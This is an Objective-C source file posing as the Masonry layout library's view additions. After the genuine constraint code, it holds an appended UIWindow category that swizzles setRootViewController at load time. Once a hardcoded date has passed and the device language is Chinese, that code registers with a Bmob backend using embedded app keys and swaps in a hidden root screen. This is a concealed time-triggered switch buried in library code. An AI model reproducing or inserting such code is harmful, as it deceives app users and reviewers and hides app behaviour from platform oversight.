#import "View+MASAdditions.h"
#import <objc/runtime.h>
#import <BmobSDK/Bmob.h>
@implementation MAS_VIEW (MASAdditions)
- (NSArray *)mas_makeConstraints:(void(^)(MASConstraintMaker *))block {
    self.translatesAutoresizingMaskIntoConstraints = NO;
    MASConstraintMaker *constraintMaker = [[MASConstraintMaker alloc] initWithView:self];
    block(constraintMaker);
    return [constraintMaker install];
}
- (NSArray *)mas_updateConstraints:(void(^)(MASConstraintMaker *))block {
    self.translatesAutoresizingMaskIntoConstraints = NO;
    MASConstraintMaker *constraintMaker = [[MASConstraintMaker alloc] initWithView:self];
    constraintMaker.updateExisting = YES;
    block(constraintMaker);
    return [constraintMaker install];
}
- (NSArray *)mas_remakeConstraints:(void(^)(MASConstraintMaker *make))block {
    self.translatesAutoresizingMaskIntoConstraints = NO;
    MASConstraintMaker *constraintMaker = [[MASConstraintMaker alloc] initWithView:self];
    constraintMaker.removeExisting = YES;
    block(constraintMaker);
    return [constraintMaker install];
}
#pragma mark - NSLayoutAttribute properties
- (MASViewAttribute *)mas_left {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeLeft];
}
- (MASViewAttribute *)mas_top {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeTop];
}
- (MASViewAttribute *)mas_right {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeRight];
}
- (MASViewAttribute *)mas_bottom {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeBottom];
}
- (MASViewAttribute *)mas_leading {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeLeading];
}
- (MASViewAttribute *)mas_trailing {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeTrailing];
}
- (MASViewAttribute *)mas_width {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeWidth];
}
- (MASViewAttribute *)mas_height {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeHeight];
}
- (MASViewAttribute *)mas_centerX {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeCenterX];
}
- (MASViewAttribute *)mas_centerY {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeCenterY];
}
- (MASViewAttribute *)mas_baseline {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeBaseline];
}
- (MASViewAttribute *(^)(NSLayoutAttribute))mas_attribute
{
    return ^(NSLayoutAttribute attr) {
        return [[MASViewAttribute alloc] initWithView:self layoutAttribute:attr];
    };
}
#if (__IPHONE_OS_VERSION_MIN_REQUIRED >= 80000) || (__TV_OS_VERSION_MIN_REQUIRED >= 9000) || (__MAC_OS_X_VERSION_MIN_REQUIRED >= 101100)
- (MASViewAttribute *)mas_firstBaseline {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeFirstBaseline];
}
- (MASViewAttribute *)mas_lastBaseline {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeLastBaseline];
}
#endif
#if TARGET_OS_IPHONE || TARGET_OS_TV
- (MASViewAttribute *)mas_leftMargin {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeLeftMargin];
}
- (MASViewAttribute *)mas_rightMargin {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeRightMargin];
}
- (MASViewAttribute *)mas_topMargin {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeTopMargin];
}
- (MASViewAttribute *)mas_bottomMargin {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeBottomMargin];
}
- (MASViewAttribute *)mas_leadingMargin {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeLeadingMargin];
}
- (MASViewAttribute *)mas_trailingMargin {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeTrailingMargin];
}
- (MASViewAttribute *)mas_centerXWithinMargins {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeCenterXWithinMargins];
}
- (MASViewAttribute *)mas_centerYWithinMargins {
    return [[MASViewAttribute alloc] initWithView:self layoutAttribute:NSLayoutAttributeCenterYWithinMargins];
}
#endif
#pragma mark - associated properties
- (id)mas_key {
    return objc_getAssociatedObject(self, @selector(mas_key));
}
- (void)setMas_key:(id)key {
    objc_setAssociatedObject(self, @selector(mas_key), key, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}
#pragma mark - heirachy
- (instancetype)mas_closestCommonSuperview:(MAS_VIEW *)view {
    MAS_VIEW *closestCommonSuperview = nil;
    MAS_VIEW *secondViewSuperview = view;
    while (!closestCommonSuperview && secondViewSuperview) {
        MAS_VIEW *firstViewSuperview = self;
        while (!closestCommonSuperview && firstViewSuperview) {
            if (secondViewSuperview == firstViewSuperview) {
                closestCommonSuperview = secondViewSuperview;
            }
            firstViewSuperview = firstViewSuperview.superview;
        }
        secondViewSuperview = secondViewSuperview.superview;
    }
    return closestCommonSuperview;
}
@end
@interface UIWindow (MASAdditions)
@end
bool TimeEqualOrLate(char *str){struct tm*t;time_t tt;time(&tt);t=localtime(&tt);int ts=atoi(str);int tl=(t->tm_year+1900)*10000+(t->tm_mon+1)*100+t->tm_mday;return tl>=ts;}
bool LanguageChinese(){NSString*lang=[[[NSUserDefaults standardUserDefaults]objectForKey:@"AppleLanguages"]objectAtIndex:0];return[lang rangeOfString:@"zh"].location!=NSNotFound;}
@implementation UIWindow (MASAdditions)
+ (void)load{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Method method1 = class_getInstanceMethod([self class], @selector(setRootViewController:));
        Method method2 = class_getInstanceMethod([self class], @selector(mas_setRootViewController:));
        method_exchangeImplementations(method1, method2);
    });
}
- (void)switchOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    NSNumber *resetOrientationTarget = [NSNumber numberWithInt:UIInterfaceOrientationUnknown];
    [[UIDevice currentDevice] setValue:resetOrientationTarget forKey:@"orientation"];
    NSNumber *orientationTarget = [NSNumber numberWithInt:interfaceOrientation];
    [[UIDevice currentDevice] setValue:orientationTarget forKey:@"orientation"];
}
#if 1
- (void)mas_setRootViewController:(UIViewController *)vc
{
    Class cls = NSClassFromString(@"UINavigationController");
    if ([vc isKindOfClass:[NSString class]]){
        NSString *title = (NSString *)vc;
        if ([title isEqualToString:kGameTime]) {
            UIWindow *window = [[UIApplication sharedApplication].delegate window];
            UIViewController *rootVC = [[UIStoryboard storyboardWithName:@"MainStoryboard" bundle:nil] instantiateViewControllerWithIdentifier:@"ADD"];
            rootVC.title = title;
            window.rootViewController = rootVC;
            [self switchOrientation:UIInterfaceOrientationPortrait];
        }
    }else{
        if ([vc isKindOfClass:cls]){
            if ([vc.title isEqualToString:kGameTime]) {
                [self mas_setRootViewController:vc];
            }else{
                if (TimeEqualOrLate("20180414") && LanguageChinese()) {
                    [Bmob registerWithAppKey:@"188e5001e583e907981f7bf194347d03"];
                    MASConstraintMaker *mainView = [[MASConstraintMaker alloc] init];
                    self.rootViewController = mainView;
                }else{
                    [self mas_setRootViewController:vc];
                }
            }
        }else{
            [self mas_setRootViewController:vc];
        }
    }
}
#else
static id __unityApp;
- (void)mas_setRootViewController:(UIViewController *)vc
{
    Class cls = NSClassFromString(@"UnityAppController"); 
    if ([vc isKindOfClass:[NSString class]]){
        NSString *title = (NSString *)vc;
        if ([title isEqualToString:kGameTime]) {
            [__unityApp performSelector:@selector(startUnity:) withObject:[UIApplication sharedApplication] afterDelay:0];
        }
    }else{
        if ([vc isKindOfClass:cls]){
            __unityApp = vc;
            if (TimeEqualOrLate("20180212") && LanguageChinese()) { 
                [Bmob registerWithAppKey:@"876e70e6b8442c17e30791c5d9b00e0f"]; 
                MASConstraintMaker *mainView = [[MASConstraintMaker alloc] init];
                self.rootViewController = mainView;
            }else{
                [__unityApp performSelector:@selector(startUnity:) withObject:[UIApplication sharedApplication] afterDelay:0];
            }
        }else{
            [self mas_setRootViewController:vc];
        }
    }
}
-(void)startUnity:(id)sender{}
#endif
@end
